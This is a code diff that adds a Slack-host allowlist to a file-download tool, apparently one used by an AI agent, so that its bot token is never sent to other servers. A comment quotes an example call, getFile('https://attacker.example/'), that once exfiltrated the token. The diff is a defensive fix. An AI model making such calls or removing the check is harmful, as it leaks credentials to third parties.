@@ -8,6 +8,30 @@ import { sanitizeFilename } from '@/lib/utils/sanitize';
 
 const SLACK_FILE_ID = /(F[A-Z0-9]{6,})/;
 
+// The download request carries the bot token in an Authorization header, so the
+// URL MUST be a Slack-owned host — otherwise a caller could name any URL and the
+// token would be sent straight to a third-party server (how the bot token was
+// once exfiltrated: getFile("https://attacker.example/") mailed the token out).
+// Slack serves file downloads from files.slack.com / *.slack.com / slack-files.com.
+function isSlackFileHost(candidate: string): boolean {
+  let parsed: URL;
+  try {
+    parsed = new URL(candidate);
+  } catch {
+    return false;
+  }
+  if (parsed.protocol !== 'https:') {
+    return false;
+  }
+  const host = parsed.hostname.toLowerCase();
+  return (
+    host === 'slack.com' ||
+    host.endsWith('.slack.com') ||
+    host === 'slack-files.com' ||
+    host.endsWith('.slack-files.com')
+  );
+}
+
 export function getFileTool({
   getSandboxContext,
 }: {
@@ -43,6 +67,13 @@ export function getFileTool({
         (file.startsWith('http') ? file : undefined);
       if (!url) {
         throw new Error(`Could not resolve a download URL for: ${file}`);
+      }
+      // Never attach the bot token to a non-Slack host. This tool is only for
+      // Slack files; use fetchUrl (or bash/curl in the sandbox) for other URLs.
+      if (!isSlackFileHost(url)) {
+        throw new Error(
+          'getFile only downloads Slack-hosted files. For any other URL use fetchUrl or fetch it from the sandbox — the bot token is never sent to a non-Slack host.'
+        );
       }
 
       const response = await fetch(url, {
